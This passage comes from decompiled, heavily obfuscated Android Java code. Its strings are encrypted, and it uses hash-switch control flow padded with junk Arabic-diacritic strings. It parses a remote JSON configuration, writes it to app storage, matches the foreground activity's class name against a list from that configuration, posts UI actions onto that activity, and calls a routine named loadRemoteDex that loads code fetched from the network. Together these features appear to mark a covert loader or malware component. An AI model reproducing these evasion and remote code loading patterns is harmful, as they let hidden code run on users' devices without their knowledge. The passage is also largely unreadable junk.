                                                                                                                                                    while (true) {
                                                                                                                                                        switch (str23.hashCode() ^ (-507927117)) {
                                                                                                                                                            case -1404559294:
                                                                                                                                                                str23 = "ۥۡۡ۠ۜۖۧۦۘۛۡۨۘ۠ۡۘۜۜۡۘ۠ۘۛۗۜۗۥۤ۠ۡۘ۬ۜۢۘۥۛ";
                                                                                                                                                            case -168354846:
                                                                                                                                                                str20 = "ۖۧ۟ۡۛ۠۬۠ۘۖۘۥۨۦۜۨۜۡۧۛۙۥۜۛ۬ۜۡۘ۬ۦۤ";
                                                                                                                                                                break;
                                                                                                                                                            case 666843414:
                                                                                                                                                                str23 = iOptInt2 != 2 ? "ۨۘۡۤۜۜۢۖ۟ۜۢۡۙۧۥۘۡۚۡۤ۟ۡۖۦۛۚ۟ۙۨۨۜ" : "ۘۦۡۢۙۡ۫ۥۦ۫ۛۡ۟ۨۛ۬ۦۖۘۜ۬۟ۛ۠ۦۚۤۥۗۨۘۦۘۛ۫ۢۗ";
                                                                                                                                                            case 1067727732:
                                                                                                                                                                str20 = "۠۠ۤۘ۬ۖۘۙ۠۫ۡۢۖۘۨۘۡۘۨۨ۫ۢۖۜۘۖۧۘۡۖۦۨۥۖۘۡ۠ۙ۠۠۫ۦۢۜۘۥۦ۬ۧۚۛۧۨۜۜۗۢ۫ۤۤ";
                                                                                                                                                                break;
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                    break;
                                                                                                                                                case 1207624528:
                                                                                                                                                    k2.logToFloatingWindow(l2.decrypt("Y680/pSV6xva0iiCybdTo7TNbf383eL73PAlgs2i\n", "OEiIbXE4c0Y=\n") + strOptString + l2.decrypt("vKnIEWMWoqzp88tkOAv9\n", "UxVE9N+vRys=\n"), l2.decrypt("OvHGfdw=\n", "X4O0Eq69ESQ=\n"));
                                                                                                                                                    new Handler(Looper.getMainLooper()).post(new q0(0, context, strOptString2));
                                                                                                                                                    continue;
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                        break;
                                                                                                                                }
                                                                                                                            }
                                                                                                                            break;
                                                                                                                    }
                                                                                                                }
                                                                                                                break;
                                                                                                            case 1529252382:
                                                                                                                String str24 = "۠ۨ۠۠ۜۚ۬ۜۡ۬ۤۚ۟۠ۖۘۙۛۨۘۦۨۛۖۜۛ۠ۤۚۥۤۨۘۙۘۙۘۥۛ";
                                                                                                                while (true) {
                                                                                                                    switch (str24.hashCode() ^ 538079041) {
                                                                                                                        case -2016297839:
                                                                                                                            str11 = "ۘۧۜۡ۬ۡۨۨۛۤۚۛۙۖۖۚۙ۠۠ۥۖۢۘۚۘۘۘۖۥۛ۫ۚۙۜۘۧۥۖۘۢۜۤۧ۟ۨۧۙۤۙۘۚۖۜ۟";
                                                                                                                            break;
                                                                                                                        case -1022001975:
                                                                                                                            str24 = "ۡۢۢ۬ۦۡۙ۬ۙۗۡۡۥۖۨۦۦ۫ۖۚ۠ۤ۟ۚۦ۫ۗۗۛۧۦۡۘ۬۠ۤ۬ۗ۟ۥۡۘۖۜ۠ۛۥۘۚۦۜۜۖ۬";
                                                                                                                        case -414794992:
                                                                                                                            str24 = jSONObjectOptJSONObject == null ? "۬ۦۜۢ۬ۖۖۨۛۢۢۘۨۖۗۙۛۨ۠ۦۨۥۚۦۘۤۜۡۘۨۤۦۘۡۢۡۘ" : "ۦۛۙۡۢۢۖۖۘۙۘۗۦۖۘۢۛ۫ۤ۬ۘ۬ۧۨۥ۬ۘۧۡۘۧۨ۠ۧۘۖۘۛ۫ۙۨ۠ۘۘ";
                                                                                                                        case 1526010689:
                                                                                                                            str11 = "ۘۨۤۦۤۤۛۨ۬ۤۢۘۨ۫ۢ۬ۧۧۥ۠ۨۘۗۛۗۥۤۖۘۘۙۧ۠۬ۥۘۡۥۧۘ";
                                                                                                                            break;
                                                                                                                    }
                                                                                                                }
                                                                                                                break;
                                                                                                        }
                                                                                                    }
                                                                                                    i = i2 + 1;
                                                                                                    break;
                                                                                                case -119816710:
                                                                                                    String str25 = "ۛۖۛۥۦۙۥۛ۠۟ۢۙ۟ۤۚۜۥ۬ۡۤۘۘۢۦۙ۫ۢۚۧ۟ۖۤۙۘۧۦۧۘ";
                                                                                                    while (true) {
                                                                                                        switch (str25.hashCode() ^ 1433006954) {
                                                                                                            case -140546317:
                                                                                                                str10 = "ۤۧۤ۠ۖۡۘۚ۫۫ۚ۬ۘۦۙۡۖۧۡۗۛ۠ۢۘۢۡۜۧۘۜ۫ۢۨۚۢۡۜۥۘۡۖۡۘ۫ۧۚ";
                                                                                                                break;
                                                                                                            case 109676612:
                                                                                                                str10 = "ۘۧۡۖۘۨۚۧۛۧۚۤۘۗۢۢۨۘۗۘۖۛۙۛۤۜ۠ۗۙۦۘۡۗۥۘ۫ۗۥۨ۟ۖۥ۬ۨ";
                                                                                                                break;
                                                                                                            case 1541506293:
                                                                                                                str25 = "ۧ۫ۜۜ۬ۦۘ۫۟ۥۡۧۧۨ۠ۤۢۙۘۗۗۛ۬۟ۨۡۤۦۦۘ۫ۢۡۘ۟۟ۙۧۗۢ۫۟ۥ";
                                                                                                            case 1677763698:
                                                                                                                str25 = i2 < jSONArrayOptJSONArray.length() ? "ۘۚۜۗۤ۟ۗۥۢۥۘۘۢ۟ۦۘۖ۟ۡۘۥ۫ۤ۬ۢۦۘۢۥۨۗۖۡۘۥۧۘ۠ۢۦۘۡ۟ۖۢۦ" : "۬ۛۤۗۚ۬ۡۛۦۗۧۥۦۙۗۛۖۢ۠۫ۜۘ۟۫ۥۘۧۦۘ۫ۛۙ۟ۜۨۘۚۢۚۥۙ۫ۧۖۚۚۘۗ۟ۨۘ";
                                                                                                        }
                                                                                                    }
                                                                                                    break;
                                                                                                case 394756552:
                                                                                                    str10 = "۬۬ۨۗۦ۟۫ۡۦۛۛۗۙ۠ۜۗ۫ۙ۫ۡۢ۠ۥۘۘۘ۬ۜ۠۟ۧ";
                                                                                                case 427564547:
                                                                                                    break;
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                    break;
                                                                                case -1140668603:
                                                                                    String str26 = "۬۬۠ۨۚ۟۬ۗۗۡۨۘۤۘۧۘۦ۟ۢۘۧۡۘ۟ۖۜۘۘۦۨۘۜۧۘۘ";
                                                                                    while (true) {
                                                                                        switch (str26.hashCode() ^ 1387068548) {
                                                                                            case -2011333706:
                                                                                                str26 = "ۗ۟ۘۥۛۥۘۥۙۤۜۛۢۨۙۨۚۜۘۚۜۘۦۧۤۜۦۚ۫۟۟ۨۨۢ۟ۛۤۤۡ۟ۛۘۘۗ۠ۦ۟ۡۘۛۗ۠۟۫ۦۘ";
                                                                                                break;
                                                                                            case -1857632592:
                                                                                                str9 = "۟ۖۙۡۦۘۘۛۙۗ۠ۙۡۘۚۦۘۢۤۤۙ۬ۙۜۘۧۘۥ۟ۙ۟ۡۨۘۜ۫ۡۘۥۚۘۘۚ۬ۙۨۥ۫ۜۛ۫ۜۖۙ۟ۡۢۡ۟";
                                                                                                continue;
                                                                                            case -1625788912:
                                                                                                if (jSONArrayOptJSONArray.length() <= 0) {
                                                                                                    str26 = "۫ۘۥۘۨۖۤۧۡۡۡۧۛ۠۠ۥۘۦۤۨۘۤ۟ۙ۟ۡۡۘۨۨۘۗۗۚۜۘۜۘۦۨۚ۟ۗۦۘۘۨۚ";
                                                                                                    break;
                                                                                                } else {
                                                                                                    str26 = "ۢ۠ۦۢۤۗۙۧۜۦۙۛ۟ۥۚۨۙۨۥۘۜۗ۠۟ۛۖ۠ۦ۬ۘۜۧۡۘۘ";
                                                                                                    break;
                                                                                                }
                                                                                            case 579143283:
                                                                                                str9 = "ۚۡۖۘۧ۟ۖۜ۠ۨۚۧۦۘۨۙۜۘۡۢۡۦۜۜۘۧۙ۟ۛۡۘۧۦۗ";
                                                                                                continue;
                                                                                                continue;
                                                                                        }
                                                                                    }
                                                                                    break;
                                                                                case -662066802:
                                                                                    str9 = "ۥۖۜۘ۠ۙۤ۟ۗۘۨۡۡۘۨ۠ۡۘ۫ۜۚۤۡۘۘۛۖۘۧۗۧۤۖۡۢۥۥۘۙۚۨۘ";
                                                                                    continue;
                                                                                case -1195007:
                                                                                    break;
                                                                                default:
                                                                                    continue;
                                                                            }
                                                                        }
                                                                        break;
                                                                    case -1014119725:
                                                                        break;
                                                                    case -417103000:
                                                                        str8 = "ۚ۠ۖۘۨۥ۫ۚۘۢ۟ۘۤۛۚۨۘۧ۫ۦۘۘۦ۬ۙۦۜۘۨۛۦۘۤۢۢ";
                                                                        continue;
                                                                    case 164754960:
                                                                        String str27 = "ۢۙۘۨۦۜۢۗۜۘۤۗ۬ۢۡ۠ۨۗۡ۠ۢۘۘ۬ۤ۠ۛۦۛۧۙۘ۠۫ۙۢ۟ۛ۠ۦۘۧۥۖ";
                                                                        while (true) {
                                                                            switch (str27.hashCode() ^ (-1361667787)) {
                                                                                case -1778717559:
                                                                                    str8 = "ۗۗۘۥۜۙۦ۫۫ۧۖۡۘ۫ۦۜۘۡۜۨۘ۬ۦۦۘۧۙۖۘۘۡۚۜۢۘۘۘۥۡۘ۬ۘۦۘۛ۫ۛۚ۠۟";
                                                                                    continue;
                                                                                    continue;
                                                                                case 92702711:
                                                                                    str27 = "ۛۛ۠ۖۨ۠ۚۛۙ۟ۡۘۘۗۥۢۜۢۢۨ۫ۧۗۖۜۘۙۨۖ";
                                                                                    break;
                                                                                case 1534740227:
                                                                                    if (jSONArrayOptJSONArray == null) {
                                                                                        str27 = "ۢۦۖۘۨۗۡۘۨۘۥۘۜۚۢۥۧۡۖۙ۬ۖۡۢۧۢۚۢۨۜۘۙۧ۬ۡۗۘۢۜۜۘۤ۟ۥۘۦۡۘ";
                                                                                        break;
                                                                                    } else {
                                                                                        str27 = "ۥۗۨ۫ۢۘۘۖۘۥۘۛۜۛ۫ۚ۫ۨۛۨۘ۫ۨۚ۫۟ۤ۠۟ۖۘۚۢۛۛۘ۟ۦ۬ۦۘ";
                                                                                        break;
                                                                                    }
                                                                                case 1915144665:
                                                                                    str8 = "ۜ۬ۨۘۙۨ۟ۙۘۜۘۘ۫ۗۙۢۦۖۘۧ۫ۨۘۥۤ۬۬ۧۖۘۤۗ۬ۙۘۘۥۥۜۘۧۚۛۜ۟ۨۤۨۨۘۤ۬ۥۘ";
                                                                                    continue;
                                                                            }
                                                                        }
                                                                        break;
                                                                }
                                                            }
                                                            break;
                                                    }
                                                }
                                                k2.logToFloatingWindow(l2.decrypt("+D44a3Yf19dGbjYdIzSoNjA8KWB2NNZvJnxiZD9U4ytLZhQQMj6mDy4+OVZ3CuI=\n", "o9mE+JOyT4o=\n"), l2.decrypt("82g=\n", "nAO7o8t40FY=\n"));
                                                b = jSONObject;
                                                c = jSONObject.optBoolean(l2.decrypt("WDBLXWo=\n", "PFUpKA3UzsQ=\n"), false);
                                                JSONArray jSONArrayOptJSONArray2 = jSONObject.optJSONArray(l2.decrypt("/SrbWoDBxyH2MNNNguXX\n", "n0a6OeuApFU=\n"));
                                                String str28 = "ۧۗۜۘۜۜۛۨ۟ۜۘۧۦۧۦۡۘۨۤۘۢ۠ۥ۬ۖۡۤۚۡ۬۟ۖۚۦۦۙ۟ۤۧۜۗۨۙ۫ۜۖۘۛۜ۟ۧ۟ۖۘۥ۬ۖۘ";
                                                while (true) {
                                                    switch (str28.hashCode() ^ (-140235255)) {
                                                        case -2053982617:
                                                            try {
                                                                FileWriter fileWriter = new FileWriter(new File(context.getFilesDir(), l2.decrypt("Zb8UlYMInlBzugOfnD6aQFiwFJWAMtFZdLwb\n", "B9N19uhX/zM=\n")), false);
                                                                try {
                                                                    fileWriter.write(jSONArrayOptJSONArray2.toString(2));
                                                                    fileWriter.flush();
                                                                    fileWriter.close();
                                                                } finally {
                                                                }
                                                            } catch (Exception e3) {
                                                                k2.logToFloatingWindow(l2.decrypt("sDFnzKsj+rECbUq63gOHYX4zXcarC8cJT2cz6+th3nY=\n", "69bbX06OYuw=\n") + e3.getMessage(), l2.decrypt("okuVB2M=\n", "xznnaBG3jBA=\n"));
                                                            }
                                                            Activity activityECt8jHZ4 = Utils.ECt8jHZ4();
                                                            String str29 = "ۚۨۗۘۛ۟۫ۦۨۡۢۡۘ۟ۡۖۘۖ۫ۜ۠ۙۧۜۜۗۙۡۖۢۦۡۘۙۚۜۤ۫ۥۥ۬ۡۘۤۙۥ";
                                                            while (true) {
                                                                switch (str29.hashCode() ^ (-938467974)) {
                                                                    case -2009818982:
                                                                        String str30 = "ۨۧ۠ۨ۬۫ۧ۬ۗ۫ۚۤ۠ۜۘۥۜ۬ۧ۠ۙۢۨۡۦۙۨۖۧ";
                                                                        while (true) {
                                                                            switch (str30.hashCode() ^ (-920366253)) {
                                                                                case -2061585131:
                                                                                    str29 = "ۜۘۧۘۥۦۡ۠۬ۥۘۨۙۥۚۚۖۘۥۛۦۘ۟ۖۡۘ۫ۧۦۘۖ۫ۘۡ۫ۦۗۦۚۛ۟۠ۨۗۥۧۡۖۘۨۥۗۢۚ۟ۘۘۖۘۥۚۧ";
                                                                                    continue;
                                                                                    continue;
                                                                                case -1608584294:
                                                                                    if (activityECt8jHZ4 == null) {
                                                                                        str30 = "ۧۧۜۥۘ۠ۢۚۛ۠ۜ۟ۤۚۚۢۛۙۢ۬ۨۘۤۜ۟ۧۖۖۘ۫ۙۥۦ۬ۖۘ۟ۚۤۙۚۗۜۥ۫ۨ۫۫۫ۛۙۛۘۖ۫ۘۜۘ";
                                                                                        break;
                                                                                    } else {
                                                                                        str30 = "ۜ۠ۙ۫۠ۦۚۦۜۦۢۡۨۤۥۘۧ۬ۖۥۖۘ۠۫ۛ۠ۙۦۘۧۖ۟ۜ۠ۥۚ۟ۥۧۚۘۖۜۡۘۤۖۦۘۥۢۢ۠ۨ۠ۡۨۜۘ";
                                                                                        break;
                                                                                    }
                                                                                case -186144823:
                                                                                    str29 = "ۙۛۦۤۧۨۙۤۦۥ۟ۗۦۡ۟۠ۧۨۨۡۘۧۥۚۖۨۨۘۡۘۛ۠ۚۚۜۘۘۘ";
                                                                                    continue;
                                                                                case 1347602945:
                                                                                    str30 = "ۧۤۖۘ۫ۜۜۙۦۘۢۘۥۘۥۢۛۧۙۙۛۛۡۘ۟ۜۙۢۚۧۥۜۘۛ۬۟۫ۤۧ";
                                                                                    break;
                                                                            }
                                                                        }
                                                                        break;
                                                                    case -1566056711:
                                                                        str29 = "۠ۦۥۡۜۧۢ۫ۤۤۜۘ۠ۢۥۘۡۡۡۘۜۢۙۧۨۜ۬ۡۚۖۥۧۜ۫۬ۛۢ۬۠ۨۛۥۤۨۘۡۡۥۙۥ";
                                                                        continue;
                                                                    case 1413713965:
                                                                        break;
                                                                    case 1779788010:
                                                                        String name = activityECt8jHZ4.getClass().getName();
                                                                        int i3 = 0;
                                                                        while (true) {
                                                                            String str31 = "ۗۙ۠ۡۢۘۡۘۚ۟ۙۜ۫ۤ۠ۨۡ۬ۢۜۨۘ۫ۢۢۗۚ۟ۦۘۡۢ۬۠ۥۡ۬ۧۦۘۦۜۦۘۨۙ۫ۦۡۥ";
                                                                            while (true) {
                                                                                switch (str31.hashCode() ^ 634167700) {
                                                                                    case -587381112:
                                                                                        String str32 = "ۢۜۤۙۗۜۡۛۙۦۗۡۘ۟ۘۙ۬ۥۘ۟ۖۙۦۡۦۘۙۥۘۡۖۡۘۚ۬ۨۘۘۘۧۘۛ۬ۘۘۘۨۡۘ";
                                                                                        while (true) {
                                                                                            switch (str32.hashCode() ^ (-1012055729)) {
                                                                                                case -1954507605:
                                                                                                    str32 = "ۚۧ۟ۡۨ۟ۙ۫ۦۘۘۘۤ۫ۧۡۘ۫۫ۖۘ۬۠ۥۘۧۥۖۘۦۨۤۗ۬۠ۚۙۥۥۜۘ";
                                                                                                case -658975334:
                                                                                                    break;
                                                                                                case 779770261:
                                                                                                    activityECt8jHZ4.runOnUiThread(new p0(context, activityECt8jHZ4, 2));
                                                                                                    break;
                                                                                                case 2111183017:
                                                                                                    String str33 = "ۡۜۙۡۛ۠ۧۧۦ۠ۘۥۚۖۦۖۡۘۧۜۘۖۥ۟ۗۗۛ۠۠۫ۚۖۥۙۙۦۘۧۜ۟ۧۥ۬ۜۤۙۚۥۤ";
                                                                                                    while (true) {
                                                                                                        switch (str33.hashCode() ^ 1398141829) {
                                                                                                            case -313185799:
                                                                                                                str33 = "۬ۜۡۘۥۥ۬ۘۧۘۚ۬ۧۧۤۥۘ۠ۛ۟ۖۡۨۜۧۘ۠۠ۥۘۛۛۗۜۧۘۘۛۨۨۤۥۦۙۙۡۤۧۜۥۦ۬۟ۗۘۘ۟ۢۜۘ";
                                                                                                            case -111558175:
                                                                                                                str32 = "ۦۨ۠ۨۢۜۥۖۘۧۥۛۗۗۚۛۨۘۛۚ۬۟ۜۢۖ۟ۧۜۡۤ";
                                                                                                                break;
                                                                                                            case 82659901:
                                                                                                                str33 = name.equals(jSONArrayOptJSONArray2.optString(i3)) ? "ۜۦۦۚ۬ۦۘ۫ۙۜۢۖۗۦۘۙۥۦۚۛۦۘۚۜۥۘۦۘۛۖۛ۫ۖ۬۬ۖۥۛ۬ۖۘ۠ۨۤ" : "ۘۘۗۛۙۨۘۛۤۚۤۥۜۧۥۙ۬۬۟ۥۧۘۘ۟ۦۨ۫ۢۚۦۜۘۛۡۧۖۢۚۤۨۗۚۜ";
                                                                                                            case 1730668504:
                                                                                                                str32 = "ۦۘ۠ۜۧۨۘۤۙۙۢ۬۫۟ۛۘۦ۬ۥۦۦۜۥۨۡۘۛۢۧ۠ۚۢ";
                                                                                                                break;
                                                                                                        }
                                                                                                    }
                                                                                                    break;
                                                                                            }
                                                                                        }
                                                                                        break;
                                                                                    case 56663123:
                                                                                        String str34 = "ۡۘ۬۟ۜۡۘۗ۠ۧۘۘۗ۟ۥۥۦۧۥۘۧۚۜ۬ۚۗ۟ۗ۟ۚۦۛۢۧۜۘۥۥ۟ۥۦ۬ۘ۬ۜۘ";
                                                                                        while (true) {
                                                                                            switch (str34.hashCode() ^ (-2070915490)) {
                                                                                                case -2081328824:
                                                                                                    str34 = i3 < jSONArrayOptJSONArray2.length() ? "۬ۛۤۘۤۡۘ۠ۡ۬ۦۘۖۜ۟ۦۚۗۖۘۛۧۡۘۧۧۖۘ۬ۡۘۖۧۜۤۙۦۦۥۖۘ" : "ۜ۠ۖ۟ۡۚ۬ۢۘۘۖۥۛۥۡۜۘۜۘۙۥ۠ۨۘۥۡۤ۟ۗ۠ۡۚ۟ۦۘۡۖۡۘۘ۬ۦ۫ۛۢۢۙۢ۟ۜۙۗۖۢ۠ۢ۠";
                                                                                                case -326972182:
                                                                                                    str34 = "ۥۥۖۘۨ۠ۗۜ۟ۜۘۛ۟ۗۤۢۛ۟ۧۛۨ۫ۛۨۤۘۘۖ۟ۡۘۘۚۛۤۦۨۘۛۙۖۘ";
                                                                                                case 468295130:
                                                                                                    str31 = "ۤ۫۟۫ۧۥۘۖۗۗۖۛ۬ۥ۬ۢۤۡۡۘۚۧۛۡۛۦۘ۬ۢۘ۟ۗۦۘۜۙۨۘۡ۬ۦۘۤ۬ۨۘۘۚۦۦ۠۫۟۫ۡۘۧۜۘۗ۟ۗ";
                                                                                                    break;
                                                                                                case 819133326:
                                                                                                    str31 = "ۙ۬ۧۤۥۥۘۨۘ۬ۦۖۗۗۘۛۛۧ۫ۜۡۢۡۡۘۘ۟ۧۖۥۖۜۚۖۨۦۥۧۘۜۢۨ۠ۚ۟ۙۧ۟ۗ";
                                                                                                    break;
                                                                                            }
                                                                                        }
                                                                                        break;
                                                                                    case 1320652535:
                                                                                        break;
                                                                                    case 2053512691:
                                                                                        str31 = "ۜۛۙۥۙ۠ۨۥۨۜۙۜۘۢۛۘۘۖۨۥۘۚۢۡۘۥۦۧۘۜۧۢۢۨۘ";
                                                                                }
                                                                            }
                                                                            i3++;
                                                                        }
                                                                        break;
                                                                    default:
                                                                        continue;
                                                                }
                                                            }
                                                            break;
                                                        case 793292586:
                                                            str28 = "ۡۦ۟ۗۚۢۙ۫۫۠ۗۤ۠ۦۨۡۗۜۛۨۛۖۚۗ۟ۙۦۘۦۦۘۤۨۡۘۚ۠ۙ";
                                                        case 1344930338:
                                                            break;
                                                        case 1471864805:
                                                            String str35 = "۬ۚۜۘۨۛۥۘۡۦۗ۫ۜۥۤۗ۠۫ۧۜ۟ۡ۟ۧۘۙۧ۬ۖۤ۟ۢۦ۠ۢۧۚۗ۫ۧۧۙۧۥۢۧۨۧۛۤ۟ۜۘ۠ۥۖۘ";
                                                            while (true) {
                                                                switch (str35.hashCode() ^ (-774744428)) {
                                                                    case -1764316461:
                                                                        if (jSONArrayOptJSONArray2 == null) {
                                                                            str35 = "ۡۢۘۘۖۦۦۙۜۘۘۥۥ۟۠ۧۜۘۢۚ۫ۗۛۛ۬ۦۙۖۦ۬ۧۚۨۘۚۨ۠ۖۧۨۘۗ۠ۖۘۘۤۦۘۥۜۙۘۜۚ";
                                                                            break;
                                                                        } else {
                                                                            str35 = "ۜۗۥۗ۫ۥۘۧۖۘۨ۫ۗۘۤۖ۬ۡۛۢۘۘۥۚ۟ۖۥۢۖ۟ۗ۫ۤ۟ۘۘۤۗۘۘۘۜۨۦ۟ۦۗۥۧۘۗ۟۫ۘ۠ۦ";
                                                                            break;
                                                                        }
                                                                    case -1375000865:
                                                                        str28 = "ۛۛۦۘۧۥۖۘۘۦ۫ۘ۫ۦۘۜۡۦۘ۟ۦ۫ۚۤۗ۫ۢۥۘ۠ۖۖۤۢ۠ۖ۠ۢ۠ۡۗۤۤۜۘۢۧۨۘۡۧۦۦ۠ۙ۬ۙۨۥ۠ۡۘ";
                                                                        continue;
                                                                    case -1370719946:
                                                                        str28 = "ۖۜ۬۟ۘۗۙۘۢۦۨۡۙ۬ۨ۠۬ۚۛۢۛۢ۟ۡۘۨۦۘ۠ۢۗۚ۠ۨۘۨۡۖۗۘۤۦۦۧۘۘۤۥ۠ۧۨ";
                                                                        continue;
                                                                    case 1572412565:
                                                                        str35 = "ۘۧۥۗ۠ۦ۫ۥۦۛۗۤ۟ۚۧۢ۟ۚ۟ۡۖۥۘۥۥۨۚۜۦۡۢۤ۫ۖۡۘۢۧ۬۟ۡ۫ۙۧۧۙۚۛ۠ۚۙۧ۬";
                                                                        break;
                                                                }
                                                            }
                                                            break;
                                                    }
                                                }
                                                Activity activityECt8jHZ42 = Utils.ECt8jHZ4();
                                                String str36 = "ۥۖۙ۟ۤۥۘۖۡۥۘ۬ۖۨۘۤۘۡۘ۟ۜۡۗ۬۫ۧۙۜۘ۬ۦۡۘۜۛۢۡ۠ۜۚۤۖۘۧۙۦۤۧ۠ۨۧۨۘۚ۟۬";
                                                while (true) {
                                                    switch (str36.hashCode() ^ 51014237) {
                                                        case -487929496:
                                                            String str37 = "ۡۥۥۘ۠ۜۧۘۛۘۥ۟ۡۡۘۡۗۛۧۗۡۘۨۛۡۘۤ۠ۨۘ۫۟ۥۘۚۥ۬ۥۜ۠ۛ";
                                                            while (true) {
                                                                switch (str37.hashCode() ^ (-1497136469)) {
                                                                    case -1504527623:
                                                                        str36 = "ۗۨۧۘۢۥۛۥۡۗۢۙۘ۫ۚۖۘۚۨۧۥۡ۬ۡۗۛۧۘۧۜۜۚ";
                                                                        continue;
                                                                    case -1414012246:
                                                                        str36 = "ۡۗ۠۬ۘۘ۠ۗۤۘۤۗۢۦۥۘۜۛۡۙۗ۠ۡۧۘ۬ۜۗۡۥ۬ۢۗ۫۠ۚ۠ۜ۟ۙۛۗۙ۬ۙۨۘۙۨ۟ۚۥۜۦۧۘ";
                                                                        continue;
                                                                        continue;
                                                                    case -660374228:
                                                                        if (!Utils.g(activityECt8jHZ42)) {
                                                                            str37 = "ۨۜۘۘۙۗ۫ۨۖ۫ۛۦۨۘۡۚۜۘۨ۫ۤۦ۠۟ۧ۬ۚۡ۟ۜۜۜ";
                                                                            break;
                                                                        } else {
                                                                            str37 = "۫ۡۙۙۚ۟۟ۡۢۡۢ۫ۘ۫ۜۜۗۢۜ۬ۦۘۦۤۘۘۗۜۘۘۜۙۖ۫ۥۨۢ۬۫ۥۡۧۘۜۡۦ";
                                                                            break;
                                                                        }
                                                                    case 158487259:
                                                                        str37 = "ۖۥۜۘۧۙ۬ۚۡ۬۫ۦ۬ۚ۠ۘۘ۟ۢۜۘۤۙۨۨ۬ۗ۬ۖ۟ۧۚۚ";
                                                                        break;
                                                                }
                                                            }
                                                            break;
                                                        case -410647013:
                                                            k2.logToFloatingWindow(l2.decrypt("NNC31fU7PwSJl4OvsSBA8/jShOX4KT+/853uwZZzA96KkrY=\n", "bzcLRhCWp1k=\n"), null);
                                                            break;
                                                        case 1386060854:
                                                            activityECt8jHZ42.runOnUiThread(new p0(activityECt8jHZ42, context, 3));
                                                            break;
                                                        case 1910127608:
                                                            str36 = "ۧۧۘۘۢۘۘ۟۬۫ۧ۫ۛۙۨۡۖۖۗۨۘۢۡۡۘۚ۟ۖۘۜۙۖۥۤۥۤۖۡ۠ۘۜۘ۠۫۟";
                                                            continue;
                                                        default:
                                                            continue;
                                                    }
                                                }
                                                Utils.loadRemoteDex(context);
                                                String str38 = "ۘۜ۠ۗۙۤ۫ۡ۬ۗ۠ۖۘۘۚۥۘۦ۟ۘۘۤۖ۫ۨۦۜۘ۫ۛۦۚۘۖۢۥۥۘۖۨۦۢۜۘۙۘۜ";
                                                while (true) {
                                                    switch (str38.hashCode() ^ (-356686204)) {
                                                        case -181556256:
                                                            break;
                                                        case 935646566:
                                                            str38 = "ۗ۬ۢۘۥۢۛ۬ۨۘۗۡۡۦۙ۟ۙۗۤ۟ۚۨۙۚۢۢ۬۬ۡۛۖۧۚۡۘۥۡۥۦ۠۟ۨۘۥۥ۟۫ۙۧۚ۬ۘۦۖ۫ۥ";
                                                            continue;
                                                        case 1038897902:
                                                            JSONArray jSONArrayOptJSONArray3 = jSONObject.optJSONArray(l2.decrypt("zdmYWt6UmjDKyJY=\n", "o7zvO73g80Y=\n"));
                                                            String str39 = "۠ۤۖۜۚۖۧ۬ۘۖۥ۟۬ۖۥۘ۬ۘۡ۬۠ۨ۟۟ۧۗۢۗ۠";
                                                            while (true) {
                                                                switch (str39.hashCode() ^ 156360434) {
                                                                    case -1931157330:
                                                                        String str40 = "ۢۦۦۘ۠ۜۡۘۥۧۖۘۢۙۖ۬ۦۤۗۘۦ۬ۡۜۡ۠ۘۚۖۖ۫۬ۘۚۙۥۘۨ۠ۡۤۦۤۛۗۜۖ۫ۖۘۛ۟ۚ";
                                                                        while (true) {
                                                                            switch (str40.hashCode() ^ 1402457283) {
                                                                                case -353004889:
                                                                                    str40 = "ۧۧ۫ۥۖۤ۬ۨۛ۠ۦۡۘ۠ۚۢۨۧۤۥ۟۬ۙۗۗۦ۫ۤۢۛۚۛۧۧۜۦۖ";
                                                                                    break;
                                                                                case 337543557:
                                                                                    if (jSONArrayOptJSONArray3 == null) {
                                                                                        str40 = "ۚ۬۠۫۠ۦۥۜۚۧۙۘ۬۠۫ۥ۬ۜ۫۠ۧۘ۟ۙۗۖ۠ۙۢۛ";
                                                                                        break;
                                                                                    } else {
                                                                                        str40 = "ۗ۬ۦۘ۬ۚۤۘۧۥۜۢۙ۬ۧۥۘۥۖۦۘ۫ۚۨۘۘۡۗۚۛ۠ۥۘۤ";
                                                                                        break;
                                                                                    }
                                                                                case 539167670:
                                                                                    str39 = "ۚۧۨۗۗ۬ۧۦۢۢۘ۫ۗۚۦۘۙۚۗ۟۠۬ۥۙۘۘ۫۫ۦۘۗۙۧ";
                                                                                    continue;
                                                                                case 973839880:
                                                                                    str39 = "۟ۦۤۚۙ۠ۚۘۢۚ۠ۥ۠ۛۙۘ۠ۜۘ۠ۜ۟۫۬ۖۤۥۘۗۚ۬ۖ۠ۚۤۛۧۚۗۘۤ۟ۖۡۥۧۚۚۧ۟ۡۘۜۡۜ";
                                                                                    continue;
                                                                            }
                                                                        }
                                                                        break;
                                                                    case -1435414415:
                                                                        String str41 = "۫ۛۨ۫ۥ۟ۢۥ۟ۛ۫ۦۛۤۤ۫ۧ۬ۦ۬ۢ۠۟۬ۙۚۡۘۜۘۥۘ۟ۘ۫۫ۖۨۘۛ۫ۧۦۡۧۦۙۤۗۖۧ";
                                                                        while (true) {
                                                                            switch (str41.hashCode() ^ 800538566) {
                                                                                case -1030161437:
                                                                                    String str42 = "۬ۚ۫ۦۗۦۘ۟ۖۥۧۙۛۢ۟۟ۜۡۙۖۘ۬ۨۨۛۜۚۦۗۥۙۥۚۥۧۘ";
                                                                                    while (true) {
                                                                                        switch (str42.hashCode() ^ 389265728) {
                                                                                            case -1218019289:
                                                                                                str41 = "ۖۛۘۖۙۥۘۛۗۡۨۨۛۖۧ۟ۛ۟ۨۗۢ۠۬ۦۨۘ۟ۧۧ۟ۗۦۘۤۗۖۘۧۦۖۧۢۥۥۖۨ۟ۤ۬";
                                                                                                continue;
                                                                                            case -655357696:
                                                                                                if (jSONArrayOptJSONArray3.length() <= 0) {
                                                                                                    str42 = "ۘۢ۟ۤۙ۬ۖۘۗۨۥۚۥ۬ۧ۠ۦۘۗۧۖۘۡۛۡ۬ۙۦۛۗۜۙۚۢۚۖۤ";
                                                                                                    break;
                                                                                                } else {
                                                                                                    str42 = "ۧۛ۟۬ۙۥۜۡ۬ۙ۠ۥۘۗۜۡۘۜۛۦۘۥۨۗ۟۠ۥ۫ۦ۫۬۠ۘۘۥۚۜۘۢۖۧۢۘ۟ۜۦ";
                                                                                                    break;
                                                                                                }
                                                                                            case -325111292:
                                                                                                str42 = "ۖ۠ۛ۬ۗۢۖۧۥۙ۟ۜۘ۟ۢۡۘۘۚۡۜۙۜۛۗۥۘۧۜۖۘۨۡ۠۬ۚۙ۬ۘۨۘۗۢۤ۫ۡۥۘ";
